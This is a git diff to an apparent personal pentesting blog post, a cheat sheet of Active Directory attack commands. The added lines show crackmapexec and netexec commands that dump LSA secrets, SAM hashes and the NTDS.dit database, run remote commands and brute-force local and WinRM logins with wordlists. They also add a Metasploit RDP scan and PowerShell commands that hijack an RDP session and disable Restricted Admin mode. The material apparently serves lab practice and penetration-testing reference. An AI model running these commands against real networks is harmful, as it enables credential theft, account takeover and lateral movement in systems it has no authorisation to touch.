@@ -2,7 +2,7 @@
 layaout: post
 title: Active Directory Tools & attacks
 image: /assets/images/ad4.png
-date: 14-01-2025
+date: 01-02-2025
 categories: [Pentesting & Techniques]
 tag: [cheat sheet, tools, Active Directory]
 excerpt: "This document is a work-in-progress where I’m compiling a variety of techniques for enumerating and exploiting Active Directory environments. It will be updated over time with additional steps and insights as I continue to explore and refine the methodology."
@@ -25,6 +25,8 @@ crackmapexec smb 10.10.10.175 -u '' -p '' # Authenticate as anonymous
 crackmapexec smb 10.10.10.175 -u 'guest' -p 'guest' # Authenticate as guest
 crackmapexec smb 10.10.10.175 -u 'valid_creds' -p 'valid_creds' # Authenticate with valid credentials
 crackmapexec smb 10.10.10.177 -u <username> -p <password> --exec -c "<command>" # Execute commands
+crackmapexec smb 10.129.202.137 --local-auth -u whare -p password! --lsa # dumping lsa if we have permission
+crackmapexec smb 10.129.202.137 --local-auth -u whare -p password! --sam #dumping sam if we have permission
 ````
 ### Smbclient
 ---
@@ -93,6 +95,37 @@ netexec ldap <target-ip> -u <user> -p <password> --module enumdc # Enumerate Dom
 netexec ldap <target-ip> -u <user> -p <password> --module user-desc # Search for users
 netexec ldap <target-ip> -u <user> -p <password> --module adcs # Check for misconfigurations in ADCS
 netexec ldap <target-ip> -u <user> -p <password> --module ldap-checker # Search for bindings
+````
+### Netexec for smb
+---
+````bash
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --ntds # Capturing ntds.ditt
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --lsa # dumping lsa
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' --sam # dumping sam
+netexec smb 10.129.202.85 -u whare -p 's3cur3p@ssw0rd!' -X 'whoami -all' # execute powershell commands
+netexec smb 10.129.43.219 -u names.list -p pws.list --local-auth # for bureforce a local acc
+````
+
+### Netexec for winrm
+---
+````bash
+netexec winrm 10.129.202.85 -u names_list.txt -p password_list.txt                     
+````
+
+## ENUMERATING RDP
+---
+### Metasploit for rdp
+---
+````bash
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS <rango_de_ips>
+run
+````
+### Hijack RDP sesssion & disable restricted admin mode
+
+````powershell
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0
 ````
 
 ## ENUMERATING TLS
